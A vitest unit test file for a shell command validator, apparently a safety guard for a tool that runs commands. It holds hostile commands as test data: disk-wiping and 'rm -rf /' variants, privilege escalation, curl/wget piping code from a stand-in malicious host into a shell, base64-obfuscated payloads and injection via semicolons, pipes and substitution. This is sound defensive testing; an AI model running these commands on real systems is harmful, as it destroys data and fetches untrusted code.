/**
 * @fileoverview Unit tests for ShellValidator - command safety validation
 */

import { describe, it, expect, beforeEach, vi } from 'vitest';
import type { ShellValidationResult, CommandPattern } from '../../../../src/types/shell.types';

describe('ShellValidator', () => {
  let ShellValidator: any;
  let validator: any;

  beforeEach(async () => {
    // Import after mocks are set up
    const module = await import('../../../../src/integrations/shell/validator');
    ShellValidator = module.ShellValidator;
    validator = new ShellValidator();
  });

  describe('Safety Checks', () => {
    it('should identify dangerous command patterns', () => {
      // Arrange
      const dangerousCommands = [
        'rm -rf /',
        'sudo rm -rf /',
        'dd if=/dev/zero of=/dev/sda',
        'mkfs.ext4 /dev/sda1',
        'chmod 777 /etc/passwd',
        'shutdown -h now',
        'reboot',
        'kill -9 1',
        'killall -9 process',
        'fdisk /dev/sda',
        '> /dev/sda',
        'cat /dev/urandom > /dev/sda',
      ];

      // Act & Assert
      for (const command of dangerousCommands) {
        const result = validator.validateCommand(command);
        expect(result.isValid).toBe(false);
        expect(result.severity).toBe('critical');
        expect(result.reason).toContain('dangerous');
      }
    });

    it('should validate safe command structure', () => {
      // Arrange
      const safeCommands = [
        'git status',
        'npm test',
        'ls -la',
        'cat package.json',
        'grep "pattern" file.txt',
        'find . -name "*.js"',
        'which git',
        'echo "hello world"',
        'pwd',
        'whoami',
        'node --version',
        'python --version',
        'docker ps',
        'kubectl get pods',
      ];

      // Act & Assert
      for (const command of safeCommands) {
        const result = validator.validateCommand(command);
        expect(result.isValid).toBe(true);
        expect(result.reason).toBeUndefined();
      }
    });

    it('should prevent privilege escalation attempts', () => {
      // Arrange
      const privilegeEscalationCommands = [
        'sudo -s',
        'sudo su',
        'su root',
        'sudo bash',
        'sudo sh',
        'sudo -i',
        'sudo /bin/bash',
      ];

      // Act & Assert
      for (const command of privilegeEscalationCommands) {
        const result = validator.validateCommand(command);
        expect(result.isValid).toBe(false);
        expect(result.severity).toBe('critical');
        expect(result.reason).toContain('privilege escalation');
      }
    });

    it('should block file system destruction patterns', () => {
      // Arrange
      const destructiveCommands = [
        'rm -rf /',
        'rm -rf /*',
        'rm -rf /home',
        'rm -rf /etc',
        'rm -rf /usr',
        'rm -rf /var',
        'rm -rf /opt',
        'rm -rf /sys',
        'rm -rf /proc',
        'shred -vfz -n 10 /dev/sda',
        'wipefs -a /dev/sda',
      ];

      // Act & Assert
      for (const command of destructiveCommands) {
        const result = validator.validateCommand(command);
        expect(result.isValid).toBe(false);
        expect(result.severity).toBe('critical');
        expect(result.reason).toContain('file system destruction');
      }
    });

    it('should detect obfuscated commands', () => {
      // Arrange
      const obfuscatedCommands = [
        'echo "cm0gLXJmIC8K" | base64 -d | sh', // base64 encoded "rm -rf /"
        'curl -s malicious-site.com | sh',
        'wget -O- malicious-site.com | bash',
        'python -c "import os; os.system(\'rm -rf /\')"',
        'node -e "require(\'child_process\').exec(\'rm -rf /\')"',
        'perl -e "system(\'rm -rf /\')"',
      ];

      // Act & Assert
      for (const command of obfuscatedCommands) {
        const result = validator.validateCommand(command);
        expect(result.isValid).toBe(false);
        expect(result.severity).toBeOneOf(['high', 'critical']);
        expect(result.reason).toContain('obfuscated');
      }
    });
  });

  describe('Pattern Matching', () => {
    it('should match known safe command patterns', () => {
      // Arrange
      const safePatterns = [
        /^git\s+/,
        /^npm\s+(test|run|list|info|view)/,
        /^ls\s/,
        /^cat\s/,
        /^grep\s/,
        /^find\s/,
        /^which\s/,
        /^echo\s/,
        /^pwd$/,
        /^whoami$/,
      ];

      const testCommands = [
        'git status',
        'npm test',
        'ls -la',
        'cat file.txt',
        'grep pattern file.txt',
        'find . -name "*.js"',
        'which node',
        'echo "hello"',
        'pwd',
        'whoami',
      ];

      // Act & Assert
      for (let i = 0; i < testCommands.length; i++) {
        const command = testCommands[i];
        const pattern = safePatterns[i];
        expect(pattern.test(command)).toBe(true);
      }
    });

    it('should identify suspicious flags and options', () => {
      // Arrange
      const suspiciousCommands = [
        'git reset --hard HEAD~100',
        'npm install --force',
        'rm file --force',
        'docker rmi --force image',
        'git clean --force',
        'chmod --recursive 777',
        'chown --recursive root:root',
      ];

      // Act & Assert
      for (const command of suspiciousCommands) {
        const result = validator.validateCommand(command);
        expect(result.isValid).toBe(false);
        expect(result.severity).toBeOneOf(['medium', 'high']);
        expect(result.reason).toContain('suspicious flags');
      }
    });

    it('should validate command arguments safely', () => {
      // Arrange
      const commandsWithArguments = [
        { command: 'git log --oneline -10', valid: true },
        { command: 'npm install express --save-dev', valid: false }, // requires confirmation
        { command: 'ls -la /home/user', valid: true },
        { command: 'cat /etc/passwd', valid: false }, // suspicious file access
        { command: 'grep -r "pattern" .', valid: true },
        { command: 'find . -name "*.log" -delete', valid: false }, // dangerous action
        { command: 'docker ps -a', valid: true },
        { command: 'docker rm -f container', valid: false }, // force removal
      ];

      // Act & Assert
      for (const { command, valid } of commandsWithArguments) {
        const result = validator.validateCommand(command);
        expect(result.isValid).toBe(valid);
      }
    });

    it('should handle case sensitivity appropriately', () => {
      // Arrange
      const commands = [
        { command: 'GIT status', valid: true },
        { command: 'NPM test', valid: true },
        { command: 'RM -RF /', valid: false },
        { command: 'SUDO rm file', valid: false },
      ];

      // Act & Assert
      for (const { command, valid } of commands) {
        const result = validator.validateCommand(command);
        expect(result.isValid).toBe(valid);
      }
    });
  });

  describe('Command Injection Detection', () => {
    it('should detect semicolon injection', () => {
      // Arrange
      const injectionCommands = [
        'ls; rm -rf /',
        'echo hello; rm important-file',
        'cat file.txt; sudo rm /etc/passwd',
        'pwd; shutdown -h now',
      ];

      // Act & Assert
      for (const command of injectionCommands) {
        const result = validator.validateCommand(command);
        expect(result.isValid).toBe(false);
        expect(result.severity).toBe('high');
        expect(result.reason).toContain('command injection');
      }
    });

    it('should detect pipe injection', () => {
      // Arrange
      const pipeInjectionCommands = [
        'ls | rm -rf /',
        'echo data | sudo tee /etc/passwd',
        'cat file | rm important',
        'find . | xargs rm -rf',
      ];

      // Act & Assert
      for (const command of pipeInjectionCommands) {
        const result = validator.validateCommand(command);
        if (command.includes('rm') || command.includes('sudo')) {
          expect(result.isValid).toBe(false);
          expect(result.severity).toBeOneOf(['high', 'critical']);
        }
      }
    });

    it('should detect backtick command substitution', () => {
      // Arrange
      const backtickCommands = [
        'echo `rm -rf /`',
        'ls `rm important-file`',
        'cat file.txt `sudo rm /etc/passwd`',
        'pwd `shutdown -h now`',
      ];

      // Act & Assert
      for (const command of backtickCommands) {
        const result = validator.validateCommand(command);
        expect(result.isValid).toBe(false);
        expect(result.severity).toBe('high');
        expect(result.reason).toContain('command substitution');
      }
    });

    it('should detect dollar command substitution', () => {
      // Arrange
      const dollarCommands = [
        'echo $(rm -rf /)',
        'ls $(rm important-file)',
        'cat file.txt $(sudo rm /etc/passwd)',
        'pwd $(shutdown -h now)',
      ];

      // Act & Assert
      for (const command of dollarCommands) {
        const result = validator.validateCommand(command);
        expect(result.isValid).toBe(false);
        expect(result.severity).toBe('high');
        expect(result.reason).toContain('command substitution');
      }
    });

    it('should detect AND/OR injection', () => {
      // Arrange
      const andOrCommands = [
        'ls && rm -rf /',
        'echo hello || rm important-file',
        'cat file && sudo rm /etc/passwd',
        'true || shutdown -h now',
      ];

      // Act & Assert
      for (const command of andOrCommands) {
        const result = validator.validateCommand(command);
        expect(result.isValid).toBe(false);
        expect(result.severity).toBeOneOf(['medium', 'high', 'critical']);
      }
    });
  });

  describe('Validation Result Details', () => {
    it('should provide detailed validation results for dangerous commands', () => {
      // Arrange
      const command = 'rm -rf /';

      // Act
      const result = validator.validateCommand(command);

      // Assert
      expect(result).toEqual({
        isValid: false,
        reason: expect.stringContaining('dangerous'),
        severity: 'critical',
        suggestion: expect.stringContaining('avoid'),
      });
    });

    it('should provide helpful suggestions for blocked commands', () => {
      // Arrange
      const testCases = [
        {
          command: 'sudo rm file',
          expectedSuggestion: expect.stringContaining('without sudo'),
        },
        {
          command: 'rm -rf directory',
          expectedSuggestion: expect.stringContaining('safer alternative'),
        },
        {
          command: 'chmod 777 file',
          expectedSuggestion: expect.stringContaining('appropriate permissions'),
        },
      ];

      // Act & Assert
      for (const { command, expectedSuggestion } of testCases) {
        const result = validator.validateCommand(command);
        expect(result.isValid).toBe(false);
        expect(result.suggestion).toEqual(expectedSuggestion);
      }
    });

    it('should categorize severity levels correctly', () => {
      // Arrange
      const severityTests = [
        { command: 'rm -rf /', expectedSeverity: 'critical' },
        { command: 'sudo rm file', expectedSeverity: 'critical' },
        { command: 'chmod 777 file', expectedSeverity: 'high' },
        { command: 'npm install --force', expectedSeverity: 'medium' },
        { command: 'git reset --hard', expectedSeverity: 'medium' },
        { command: 'ls $(echo dangerous)', expectedSeverity: 'high' },
      ];

      // Act & Assert
      for (const { command, expectedSeverity } of severityTests) {
        const result = validator.validateCommand(command);
        expect(result.severity).toBe(expectedSeverity);
      }
    });
  });

  describe('Custom Pattern Support', () => {
    it('should support custom safe patterns', () => {
      // Arrange
      const customSafePatterns = ['custom-tool', 'my-script.sh'];
      const validatorWithCustom = new ShellValidator({ customSafePatterns });

      // Act
      const result1 = validatorWithCustom.validateCommand('custom-tool --help');
      const result2 = validatorWithCustom.validateCommand('my-script.sh --version');

      // Assert
      expect(result1.isValid).toBe(true);
      expect(result2.isValid).toBe(true);
    });

    it('should support custom dangerous patterns', () => {
      // Arrange
      const customDangerousPatterns = ['dangerous-tool', 'risky-script'];
      const validatorWithCustom = new ShellValidator({ customDangerousPatterns });

      // Act
      const result1 = validatorWithCustom.validateCommand('dangerous-tool --execute');
      const result2 = validatorWithCustom.validateCommand('risky-script');

      // Assert
      expect(result1.isValid).toBe(false);
      expect(result2.isValid).toBe(false);
    });

    it('should override default patterns with custom ones', () => {
      // Arrange
      const customSafePatterns = ['rm']; // Override rm to be safe (for testing)
      const validatorWithCustom = new ShellValidator({ customSafePatterns });

      // Act
      const result = validatorWithCustom.validateCommand('rm file.txt');

      // Assert
      expect(result.isValid).toBe(true); // Should be overridden as safe
    });
  });

  describe('Edge Cases', () => {
    it('should handle empty commands', () => {
      // Arrange
      const emptyCommands = ['', '   ', '\t', '\n'];

      // Act & Assert
      for (const command of emptyCommands) {
        const result = validator.validateCommand(command);
        expect(result.isValid).toBe(false);
        expect(result.reason).toContain('empty');
      }
    });

    it('should handle very long commands', () => {
      // Arrange
      const longCommand = 'git log ' + '--oneline '.repeat(1000);

      // Act
      const result = validator.validateCommand(longCommand);

      // Assert
      expect(result.isValid).toBe(false);
      expect(result.reason).toContain('too long');
    });

    it('should handle unicode and special characters', () => {
      // Arrange
      const unicodeCommands = [
        'echo "Hello 世界"',
        'grep "café" file.txt',
        'find . -name "*.файл"',
      ];

      // Act & Assert
      for (const command of unicodeCommands) {
        const result = validator.validateCommand(command);
        expect(result.isValid).toBe(true);
      }
    });

    it('should handle malformed commands gracefully', () => {
      // Arrange
      const malformedCommands = [
        'git"status',
        "npm 'test'unclosed",
        'ls `unclosed backtick',
        'echo $(unclosed substitution',
      ];

      // Act & Assert
      for (const command of malformedCommands) {
        const result = validator.validateCommand(command);
        expect(result.isValid).toBe(false);
        expect(result.reason).toContain('malformed');
      }
    });
  });
});